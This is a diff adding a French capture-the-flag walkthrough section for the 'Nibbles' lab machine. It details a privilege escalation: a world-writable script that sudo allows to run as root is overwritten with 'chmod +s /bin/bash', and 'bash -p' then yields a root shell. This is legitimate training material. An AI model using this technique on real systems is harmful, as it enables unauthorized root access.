@@ -777,32 +777,215 @@ L’étape suivante consiste à analyser le fichier `personal.zip` et à cherche
 
 {{< escalade-intro user="nibbler" >}}
 
-### Vérification sudo
+### Vérification des droits sudo
+
+Après la prise de pied et la récupération du flag utilisateur, tu vérifies les droits `sudo` disponibles pour l’utilisateur `nibbler` :
 
 ```bash
 sudo -l
 ```
 
-### Exploration du contexte utilisateur
+Résultat :
 
 ```bash
-whoami
-id
-pwd
-uname -a
-hostname
-find /home /opt -type f -readable 2>/dev/null
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 ```
+
+Le résultat indique que `nibbler` peut exécuter en tant que `root`, sans mot de passe, le script suivant :
+
+```bash
+/home/nibbler/personal/stuff/monitor.sh
+```
+
+Tu vérifies alors si ce fichier existe déjà :
+
+```bash
+ls -l /home/nibbler/personal/stuff/monitor.sh
+```
+
+Le fichier n’est pas présent pour le moment. Le chemin indiqué par `sudo` pointe donc vers un script attendu, mais pas  disponible dans l’arborescence actuelle.
+
+### Recherche du script monitor.sh
+
+Tu reviens alors dans le répertoire personnel de `nibbler` pour examiner les fichiers disponibles :
+
+```bash
+cd /home/nibbler
+ls -l
+```
+
+Résultat :
+
+```bash
+total 8
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Jun 12 09:01 user.txt
+```
+
+En plus du flag utilisateur, tu trouves une archive nommée `personal.zip`.
+
+Comme le nom du chemin autorisé par `sudo` commence par `/home/nibbler/personal/`, cette archive est un bon candidat pour contenir l’arborescence manquante.
+
+Tu peux d’abord lister son contenu sans l’extraire :
+
+```bash
+unzip -l personal.zip
+```
+
+L’archive contient notamment le fichier attendu :
+
+```text
+personal/
+personal/stuff/
+personal/stuff/monitor.sh
+```
+
+Tu extrais ensuite l’archive :
+
+```bash
+unzip personal.zip
+```
+
+Puis tu vérifies les fichiers extraits :
+
+```bash
+find personal -type f -ls
+```
+
+Résultat :
+
+```bash
+970      4 -rwxrwxrwx   1 nibbler  nibbler      4015 May  8  2015 personal/stuff/monitor.sh
+```
+
+La sortie confirme la présence du fichier `monitor.sh` dans l’arborescence extraite :
+
+```bash
+personal/stuff/monitor.sh
+```
+
+Son chemin complet correspond maintenant au chemin autorisé par `sudo` :
+
+```bash
+/home/nibbler/personal/stuff/monitor.sh
+```
+
+Les permissions sont particulièrement favorables :
+
+```text
+-rwxrwxrwx
+```
+
+Cela signifie que le script est lisible, exécutable, mais aussi modifiable par `nibbler`.
+
+À ce stade, tu as donc un script modifiable par l’utilisateur courant, et ce même script peut être exécuté en tant que `root` via `sudo`.
+
+### Validation de l’exécution en root
+
+Avant de modifier définitivement le script, tu peux faire un test simple pour confirmer que son contenu est bien exécuté avec les privilèges `root`.
+
+Par prudence, tu conserves d’abord une copie du script original :
+
+```bash
+cp /home/nibbler/personal/stuff/monitor.sh /home/nibbler/personal/stuff/monitor.sh.bak
+```
+
+Tu remplaces ensuite temporairement son contenu par une commande de test :
+
+```bash
+echo 'id > /var/tmp/monitor-test.txt' > /home/nibbler/personal/stuff/monitor.sh
+```
+
+Tu t’assures que le script reste exécutable :
+
+```bash
+chmod +x /home/nibbler/personal/stuff/monitor.sh
+```
+
+Puis tu l’exécutes avec `sudo` :
+
+```bash
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+Tu vérifies le résultat écrit dans `/var/tmp` :
+
+```bash
+cat /var/tmp/monitor-test.txt
+```
+
+Résultat attendu :
+
+```bash
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Ce test confirme que le contenu de `monitor.sh` est bien exécuté avec les privilèges `root`.
+
+### Exploitation avec un Bash SUID
+
+Une fois l’exécution root confirmée, tu remplaces la commande de test par une commande permettant de poser le bit SUID sur `/bin/bash` :
+
+```bash
+echo 'chmod +s /bin/bash' > /home/nibbler/personal/stuff/monitor.sh
+```
+
+Tu relances ensuite le script avec `sudo` :
+
+```bash
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+Tu vérifies les permissions de `/bin/bash` :
+
+```bash
+ls -l /bin/bash
+```
+
+Le bit SUID doit maintenant apparaître dans les permissions :
+
+```bash
+-rwsr-sr-x 1 root root ... /bin/bash
+```
+
+Tu peux alors lancer Bash en conservant les privilèges effectifs du propriétaire du binaire avec l’option `-p` :
+
+```bash
+bash -p
+```
+
+Tu vérifies l’identité obtenue :
+
+```bash
+id
+```
+
+Résultat attendu :
+
+```bash
+uid=1001(nibbler) gid=1001(nibbler) euid=0(root) egid=0(root) groups=0(root),1001(nibbler)
+```
+
+L’`euid=0(root)` confirme que le shell dispose des privilèges effectifs de `root`.
 
 ### root.txt
 
-Une fois root, tu peux lire le flag final :
+Tu peux maintenant lire le flag root :
 
 ```bash
-cat /root/root.txt
+bash-4.3# cat /root/root.txt
+8229xxxxxxxxxxxxxxxxxxxxxxxxxx2621
 ```
 
-Cette étape termine l’escalade de privilèges.
+La prise de contrôle root est obtenue, ce qui termine l’escalade de privilèges et le challenge.
+
+
+
+
 
 ## Conclusion
 
